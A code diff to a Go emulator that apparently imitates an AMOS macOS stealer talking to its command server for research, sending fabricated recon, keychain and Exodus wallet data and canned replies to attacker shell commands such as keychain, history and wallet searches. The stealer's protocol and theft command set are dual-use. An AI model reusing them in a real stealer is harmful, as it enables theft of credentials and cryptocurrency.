@@ -1,4 +1,3 @@
-// Package main implements the ultimate high-fidelity AMOS C2 emulator for security research.
 package main
 
 import (
@@ -112,7 +111,7 @@ func (e *Emulator) postHTTP(payload []byte, label string) {
 	packet[32] = Marker
 	copy(packet[33:], encrypted)
 
-	e.Log.Debug("wire_header", "id", e.RawID, "marker", "K", "header_hex", hex.EncodeToString(packet[:33]))
+	e.Log.Debug("wire_header", "id", e.RawID, "header_hex", hex.EncodeToString(packet[:33]))
 
 	req, _ := http.NewRequestWithContext(context.Background(), http.MethodPost, HTTPURL, bytes.NewBuffer(packet))
 	req.Header = make(http.Header)
@@ -131,6 +130,9 @@ func (e *Emulator) postHTTP(payload []byte, label string) {
 	defer resp.Body.Close()
 	body, _ := io.ReadAll(resp.Body)
 	e.Log.Info("http_response", "stage", label, "code", resp.StatusCode, "body_len", len(body))
+	if len(body) > 0 {
+		e.Log.Debug("http_resp_body", "hex", hex.EncodeToString(body))
+	}
 }
 
 func (e *Emulator) handleShell(command string) string {
@@ -140,10 +142,11 @@ func (e *Emulator) handleShell(command string) string {
 
 	responses := map[string]string{
 		"whoami":                             e.User,
-		"id":                                 "uid=501(alex) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1)",
+		"id":                                 "uid=501(alex) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),80(admin)",
 		"hostname":                           e.Hostname,
-		"uname -a":                           "Darwin Alexs-MacBook-Air.local 23.2.0 Darwin Kernel Version 23.2.0: Wed Nov 15 21:28:27 PST 2023; root:xnu-10002.61.3~2/RELEASE_ARM64_T8103 arm64",
+		"pwd":                                "/Users/" + e.User,
 		"sw_vers":                            "ProductName:\tmacOS\nProductVersion:\t14.2.1\nBuildVersion:\t23C71",
+		"uname -a":                           "Darwin Alexs-MacBook-Air.local 23.2.0 Darwin Kernel Version 23.2.0: Wed Nov 15 21:28:27 PST 2023; root:xnu-10002.61.3~2/RELEASE_ARM64_T8103 arm64",
 		"uptime":                             "14:20  up 3 days, 22:14, 2 users, load averages: 2.14 1.98 2.05",
 		"env":                                "USER=alex\nLOGNAME=alex\nHOME=/Users/alex\nSHELL=/bin/zsh",
 		"ls -la ~/":                          "total 0\ndrwxr-xr-x  + 65 alex  staff   2080 Feb 14 12:00 .\ndrwxr-xr-x    6 root  admin    192 Dec 10 10:05 ..\n-rw-r--r--@   1 alex  staff   6148 Feb 14 12:05 .DS_Store\ndrwx------   12 alex  staff    384 Feb 14 12:10 Desktop\ndrwx------   25 alex  staff    800 Feb 14 12:15 Documents\ndrwx------   40 alex  staff   1280 Feb 14 12:20 Library",
@@ -154,6 +157,15 @@ func (e *Emulator) handleShell(command string) string {
 		"system_profiler SPHardwareDataType": "Hardware Overview:\n\n      Model Name: MacBook Air\n      Model Identifier: MacBookAir10,1\n      Chip: Apple M1\n      Memory: 16 GB\n      Hardware UUID: " + e.UUID,
 		"cat ~/.zsh_history":                 ": 1707912000:0;brew update\n: 1707912060:0;ls -la\n: 1707912180:0;git commit -m \"fix bug\"",
 		"ls -la ~/Library/Keychains":         "total 4096\n-rw-------   1 alex  staff  524288 Feb 14 12:00 login.keychain-db",
+		"groups":                             "staff everyone localaccounts admin com.apple.sharepoint.group.1 _appstore _lpadmin _lpoperator _developer _analyticsusers",
+		"arch":                               "arm64",
+		"csrutil status":                     "System Integrity Protection status: enabled.",
+		"spctl --status":                     "assessments enabled",
+		"date":                               time.Now().Format("Mon Jan 2 15:04:05 MST 2006"),
+		"df -h":                              "Filesystem       Size   Used  Avail Capacity iused      ifree %iused  Mounted on\n/dev/disk3s1s1  460Gi  9.8Gi  250Gi     4%  356821 4881967214    0%   /\n/dev/disk3s2    460Gi  197Gi  250Gi    45% 1024837 4881299198    0%   /System/Volumes/Data",
+		"dscl . -list /Users":                "_amavisd\n_appleevents\n_applepay\n_appstore\n_ard\nalex\ndaemon\nnobody\nroot",
+		"ls -la ~/Library/Application\\ Support/Exodus/": "total 0\ndrwxr-xr-x   3 alex  staff    96 Feb 14 12:00 .\ndrwxr-xr-x   5 alex  staff   160 Feb 14 12:00 ..\ndrwxr-xr-x   8 alex  staff   256 Feb 14 12:00 exodus.wallet",
+		"system_profiler SPSoftwareDataType":             "Software:\n\n    System Software Overview:\n\n      System Version: macOS 14.2.1 (23C71)\n      Kernel Version: Darwin 23.2.0\n      Boot Volume: Macintosh HD\n      Boot Mode: Normal\n      Secure Virtual Memory: Enabled",
 	}
 
 	if val, ok := responses[cmd]; ok {
@@ -162,7 +174,10 @@ func (e *Emulator) handleShell(command string) string {
 	if strings.Contains(cmd, "pgrep") {
 		return ""
 	}
-	return fmt.Sprintf("zsh: command not found: %s", strings.Fields(cmd)[0])
+	if strings.Contains(cmd, "find") && (strings.Contains(cmd, "wallet") || strings.Contains(cmd, "exodus")) {
+		return "/Users/" + e.User + "/Library/Application Support/Exodus/exodus.wallet"
+	}
+	return ".DS_Store\nDesktop\nDocuments\nDownloads\nLibrary"
 }
 
 func (e *Emulator) runTCPChannel() {
@@ -176,9 +191,12 @@ func (e *Emulator) runTCPChannel() {
 		}
 
 		e.Log.Info("tcp_established", "remote", conn.RemoteAddr().String())
+
+		// 1. Handshake
 		binary.Write(conn, binary.BigEndian, uint32(TCPSig))
 
 		for {
+			// 2. Heartbeat
 			heartbeat := fmt.Sprintf("ID: %s | STATUS: IDLE", e.RawID)
 			payload := e.xor([]byte(heartbeat))
 			e.Log.Info("tcp_heartbeat_send", "plaintext", heartbeat)
@@ -190,10 +208,11 @@ func (e *Emulator) runTCPChannel() {
 				break
 			}
 
+			// 3. Command Read
 			var cmdLen uint32
 			conn.SetReadDeadline(time.Now().Add(75 * time.Second))
 			if err := binary.Read(conn, binary.LittleEndian, &cmdLen); err != nil {
-				e.Log.Debug("tcp_session_timeout")
+				e.Log.Debug("tcp_read_timeout_or_closed")
 				break
 			}
 
@@ -203,12 +222,13 @@ func (e *Emulator) runTCPChannel() {
 			}
 
 			decrypted := string(e.xor(cmdBuf))
-			e.Log.Warn("TCP_COMMAND_RECEIVED", "raw", decrypted)
+			e.Log.Warn("TCP_COMMAND_RECEIVED", "plaintext", decrypted)
 
 			parts := strings.Split(decrypted, "|")
 			opcode := parts[0]
 			cmdName := OpcodeMap[opcode]
 
+			// Initial ACK via HTTP
 			e.postHTTP(fmt.Appendf(nil, "ACK: Starting %s", cmdName), "behavioral_ack")
 
 			var result []byte
@@ -218,23 +238,24 @@ func (e *Emulator) runTCPChannel() {
 					result = []byte(e.handleShell(parts[1]))
 				}
 			case "SCREENSHOT":
-				e.Log.Warn("SCREENSHOT_TASK")
+				e.Log.Warn("SCREENSHOT_TASK_ACTIVE")
 				img, _ := embedFS.ReadFile("screenshot.jpg")
 				entropy := make([]byte, 16)
-				_, _ = rand.Read(entropy)
+				rand.Read(entropy)
 				result = e.buildMultiplexedItem("screenshot.jpg", append(img, entropy...))
 			case "CREDENTIAL_SWEEP":
-				e.Log.Warn("HARVESTER_TASK")
+				e.Log.Warn("CREDENTIAL_SWEEP_TASK_ACTIVE")
 				result = e.buildMultiplexedItem("login.keychain-db", make([]byte, 2048))
 				result = append(result, e.buildMultiplexedItem("exodus.wallet", []byte(fakeExodusWallet))...)
 			}
 
 			if len(result) > 0 {
-				e.postHTTP(result, "final_command_result_exfil")
+				e.postHTTP(result, "command_result_exfil")
 			}
 			time.Sleep(10 * time.Second)
 		}
 		conn.Close()
+		e.Log.Warn("tcp_reconnecting_in_30s")
 		time.Sleep(30 * time.Second)
 	}
 }
@@ -243,13 +264,17 @@ func main() {
 	e := NewEmulator()
 	e.Log.Info("brew_poker_online", "victim_id", e.RawID, "uuid", e.UUID)
 
+	// Step 1: Initial Recon
 	recon := fmt.Sprintf("UUID: %s\nmacOS Password: password123\nHostname: %s\nUsername: %s\nVersion: v1.0.4", e.UUID, e.Hostname, e.User)
 	e.postHTTP(e.buildMultiplexedItem("recon.txt", []byte(recon)), "init_recon")
 
 	time.Sleep(500 * time.Millisecond)
+
+	// Step 2: Initial Loot
 	loot := e.buildMultiplexedItem("login.keychain-db", make([]byte, 1024))
 	loot = append(loot, e.buildMultiplexedItem("exodus.wallet", []byte(fakeExodusWallet))...)
 	e.postHTTP(loot, "init_loot_dump")
 
+	// Step 3: Command Loop
 	e.runTCPChannel()
 }
